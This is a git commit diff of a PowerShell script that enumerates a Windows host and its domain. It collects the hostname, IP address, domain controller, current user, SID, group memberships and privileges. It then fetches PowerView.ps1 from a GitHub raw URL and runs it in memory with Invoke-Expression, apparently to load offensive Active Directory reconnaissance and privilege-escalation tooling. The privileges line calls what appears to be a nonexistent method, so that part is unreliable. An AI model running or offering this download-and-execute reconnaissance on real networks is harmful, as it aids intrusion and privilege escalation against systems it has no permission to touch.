18e7f65176cc5b3d0654f4c9fa8fcc0ac2da47ef
conma293 <conma293@gmail.com>
2023-05-15 10:38:13 +0800

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -1,28 +1,30 @@
-# Get computer name, local IP address, and domain
+## Computer information
 $computerName = $env:COMPUTERNAME
 $localIP = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -like 'Wi-Fi'}).IPAddress
 $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+$domainController = (Get-ADDomainController -Discover -Service PrimaryDC).HostName
 
-# Get current user name, SID, and group memberships
+## User information
 $windowsIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
 $userName = $windowsIdentity.Name
 $sid = $windowsIdentity.User.Value
 $groups = $windowsIdentity.Groups | ForEach-Object {$_.Translate([System.Security.Principal.NTAccount]).Value}
-
-# Get current user privileges
 $principal = [System.Security.Principal.WindowsPrincipal]::new($windowsIdentity)
 $privileges = $principal.GetEffectiveRightsAndPermissions('').Privileges | ForEach-Object {$_.DisplayName}
 
+Write-Host "## Computer information"
 Write-Host "Hostname: $computerName"
-Write-Host "Domain: $domain"
 Write-Host "Local IP address: $localIP"
+Write-Host "Domain: $domain"
+Write-Host "Domain Controller: $domainController"
+
+Write-Host "## User information"
 Write-Host "Current user: $userName"
 Write-Host "SID: $sid"
 Write-Host "Groups:`n$($groups -join "`n")"
 Write-Host "Privileges:`n$($privileges -join "`n")"
 
-# Import powerview and powerup scripts 
-
+## Import powerview and powerup modules
 try {
     $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/conma293/mvp/main/PowerView.ps1' -UseBasicParsing
     Invoke-Expression $($pwContent.Content)
